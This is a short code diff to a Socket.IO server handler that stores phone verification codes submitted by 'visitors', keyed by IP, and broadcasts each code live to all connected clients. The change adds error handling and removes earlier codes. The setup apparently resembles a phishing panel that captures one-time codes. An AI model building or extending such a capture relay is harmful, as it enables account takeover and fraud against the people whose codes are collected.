@@ -295,23 +295,35 @@ io.on("connection", (socket) => {
 
   // Visitor: phone-code
   socket.on("submitPhoneCode", async ({ ip, verification_code_three }) => {
-    // 1) Ensure the User exists
-    const user = await findOrCreateUser(ip);
-    const saved = await PhoneCode.create({
-      ip: ip,
-      user: user._id,
-      code: verification_code_three,
-      time: Date.now(),
-    });
+    try {
+      // 1) Ensure the User exists
+      const user = await findOrCreateUser(ip);
 
-    io.emit("newPhoneCode", {
-      ip: user.ip,
-      verification_code_three: saved.code,
-      time: saved.time,
-    });
-    socket.emit("ackPhoneCode", { success: true, error: null });
+      // 2) Remove any previous phone-code for this user (or use { ip } if you prefer)
+      await PhoneCode.deleteMany({ user: user._id });
 
-    // 4) Ack back to the client
+      // 3) Create the fresh record
+      const saved = await PhoneCode.create({
+        user: user._id,
+        ip,
+        code: verification_code_three,
+        time: Date.now(),
+      });
+
+      // 4) Broadcast + ack
+      io.emit("newPhoneCode", {
+        ip: user.ip,
+        verification_code_three: saved.code,
+        time: saved.time,
+      });
+      socket.emit("ackPhoneCode", { success: true, error: null });
+    } catch (err) {
+      console.error("submitPhoneCode error:", err);
+      socket.emit("ackPhoneCode", {
+        success: false,
+        error: err.message || "Server error",
+      });
+    }
   });
 
   // Visitor: third-party purchase
